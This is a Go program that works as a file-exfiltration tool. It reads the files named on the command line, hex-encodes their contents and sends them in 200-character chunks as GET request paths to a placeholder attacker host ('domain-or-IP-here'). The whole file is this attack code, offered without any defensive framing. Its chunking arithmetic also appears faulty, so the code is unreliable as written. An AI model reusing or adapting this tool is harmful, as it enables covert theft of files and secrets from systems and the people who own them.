package main

import (
        "net/http"
        "io/ioutil"
        "os"
        "fmt"
        "encoding/hex"
)

func main() {
  args := os.Args[1:]

  for _,file := range args {

    if _,err := os.Stat(file); err == nil || os.IsExist(err){
      if data, er := ioutil.ReadFile(file); er == nil {
        fmt.Println("[+] Sending file " + file + " using hex encoding as a URI parameter in a GET request...")
        plain := string(data)
        plain2 := []byte(plain)
        encoded := hex.EncodeToString(plain2)
        initializer := 0
        length := len(encoded)
        for {

          if initializer == 0{
            int1 := 200*initializer
            int2 := 200 + int1
            sendme := encoded[int1:int2]
            length -= 200
            initializer += 1
            dom := "http://domain-or-IP-here/" + sendme
	    _,err := http.Get(dom)
             if err != nil{
			fmt.Println(err)
	     }
          }else {
            int3 := 200*initializer
            int4 := 200 + int3

            if (length < 200){
              sendmefinal := encoded[int3:(int4-(length))]
              mydom := "http://domain-or-IP-here/" + sendmefinal
              _,err := http.Get(mydom)
	      if err != nil{
                        fmt.Println(err)
             } 
              fmt.Println("[+] File " + file + " successfully sent!")
              break
            }
            sendme2 := encoded[int3:int4]
            dom2 := "http://domain-or-IP-here/" + sendme2
            _,err := http.Get(dom2)
	    if err != nil{
                        fmt.Println(err)
             }
            length -= 200
            initializer += 1
          }


        }

      } else {
        fmt.Println("Error opening file " + file)
        os.Exit(1)
      }

    } else {
      fmt.Println("Input file " + file + " NOT found! Exiting...")
      os.Exit(1)
    }

  }

}
